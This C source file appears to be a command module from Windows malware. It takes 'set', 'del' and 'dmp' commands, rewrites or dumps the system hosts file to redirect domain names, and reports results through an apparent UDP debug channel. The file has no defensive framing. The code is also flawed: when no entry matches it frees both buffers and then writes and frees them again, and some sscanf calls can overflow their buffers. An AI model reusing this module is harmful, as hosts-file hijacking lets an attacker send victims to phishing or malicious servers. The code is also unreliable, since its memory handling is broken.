#include "Stdafx.h"

int process_cmd(HANDLE hHostsfile, int cmd = CMD_DMP, 
	char *szHostname = NULL, char *szIp = NULL);

int process_cmd_dns(char *cmdline)
{
	char szHostname[128];
	char szIp[32];
	char szCmd[15];
	char szHostsPath[1024];
	char szWindowsDir[128];
	int  res;
	HANDLE hHostsfile;
	
	if(!GetWindowsDirectory(szWindowsDir, sizeof(szWindowsDir)))
		return -1;

	wsprintf(szHostsPath, "%s\\system32\\drivers\\etc\\hosts", szWindowsDir);

	deb("hosts path: %s", szHostsPath);

	hHostsfile = CreateFile(szHostsPath, GENERIC_READ | GENERIC_WRITE, 
		FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); 
	if(hHostsfile == INVALID_HANDLE_VALUE) 
	{ 
		udpdeb("cmd_dns.c: could not open hosts file %s. %s", szHostsPath, fmterr());
		return -1;
	} 

	res = sscanf(cmdline, "%s %s %s", szCmd, szHostname, szIp);
	if(res < 1)
	{
		deb("cmd_dns: params %d", res);
		return -1;
	}

	if(strcmp(szCmd, "set") == 0)
	{
		if(res == 3)
			process_cmd(hHostsfile, CMD_SET, szHostname, szIp);
		else
			deb("cmd_dns: add command params low %d", res);
	}
	else if(strcmp(szCmd, "del") == 0)
	{
		if(res == 2)
			process_cmd(hHostsfile, CMD_DEL, szHostname, NULL);
		else
			deb("cmd_dns: del command params %d", res);
	}
	else if(strcmp(szCmd, "dmp") == 0)
		process_cmd(hHostsfile);
	else
		udpdeb("unknown dns command");

	CloseHandle(hHostsfile);
	return 0;
}

int process_cmd(HANDLE hHostsfile, int cmd, char *szHostname, char *szIp)
{
	char *buffer = NULL, *newbuffer, *ptoken;
	char thost[128], tip[128], recline[255];
	DWORD dwRead, dwSize;
	int res, fixed = 0;
	
	deb("process_cmd: cmd: 0x%x hostname: %s ip: %s", cmd, szHostname, szIp);
	dwSize = GetFileSize(hHostsfile, NULL);
	deb("hosts size: %d", dwSize);
	
	buffer = (char*) halloc(dwSize + 2);
	if(buffer == NULL)
	{
		deb("cmd_dns_set: failed to halloc %d bytes for buffer", dwSize);
		return -1;
	}
	memset(buffer, 0, dwSize + 2);
	
	res = ReadFile(hHostsfile, buffer, dwSize, &dwRead, NULL);
	if(!res)
	{
		deb("read %d bytes", dwRead);
	}
	
	if(cmd == CMD_DMP)
	{
		udpdeb("hosts: \n%s", buffer);
		deb("hosts: \n%s", buffer);
		hfree(buffer);
		return 0;
	}
	
	newbuffer = (char*) halloc(dwSize + 255);
	if(newbuffer == NULL)
	{
		deb("cmd_dns_set: failed to halloc %d bytes for newbuffer", dwSize);
		hfree(buffer);
		return -1;
	}
	memset(newbuffer, 0, dwSize + 255);
	
	if(cmd == CMD_SET)
	{
		wsprintf(recline, "%s %s\r\n", szIp, szHostname);
		deb("recline: %s", recline);
	}
	deb("unfixed hosts\n%s", buffer);
	
	ptoken = (char*) strtok(buffer, "\r\n");
	
	if(ptoken != NULL)
	{
		strcat(newbuffer, ptoken);
		strcat(newbuffer, "\r\n");
		while((ptoken = (char*) strtok(NULL, "\r\n")) != NULL)
		{
			if(strlen(ptoken) < 2)
				continue;
			if(ptoken[0] == '#') 
			{
				strcat(newbuffer, ptoken);
				strcat(newbuffer, "\r\n");
				continue;
			}
			deb("scanning vars");
			if(sscanf(ptoken, "%128s %128s", tip, thost) != 2) 
			{
				deb("erroneous entry %s", ptoken);
				strcat(newbuffer, ptoken);
				strcat(newbuffer, "\r\n");
			} else {
				if(_strcmpi(thost, szHostname) == 0) 
				{
					deb("skipped existent entry %s %s", thost, tip);
					udpdeb("dns: chg %s => %s", thost, szIp);
					fixed++;
				} else {
					deb("normal entry: %s => %s", thost, tip);
					strcat(newbuffer, ptoken);
					strcat(newbuffer, "\r\n");
				}
			}
		}
	}
	
	if(cmd == CMD_SET)
		strcat(newbuffer, recline);

	deb("fixed hosts: \n%s", newbuffer);
	
	if(!fixed) {
		if(cmd == CMD_DEL)
			udpdeb("dns: del %s not found", szHostname);
		else
			udpdeb("dns: add %s => %s OK", szIp, szHostname);

		hfree(buffer);
		hfree(newbuffer);
	}

	SetFilePointer(hHostsfile, 0L, NULL, FILE_BEGIN);
	res = WriteFile(hHostsfile, newbuffer, strlen(newbuffer), &dwRead, NULL);
	if(res == 0) {
		deb("cmd_dns: WriteFile: %s", FORMATERROR);
	}
	
	deb("written %d bytes", dwRead);
	
	SetEndOfFile(hHostsfile);
	
	hfree(buffer);
	hfree(newbuffer);
	
	if(cmd == CMD_DEL)
		udpdeb("dns: del %s OK", szHostname);
	else
		udpdeb("dns: chg %s => %s OK", szIp, szHostname);
	
	return 0;
}
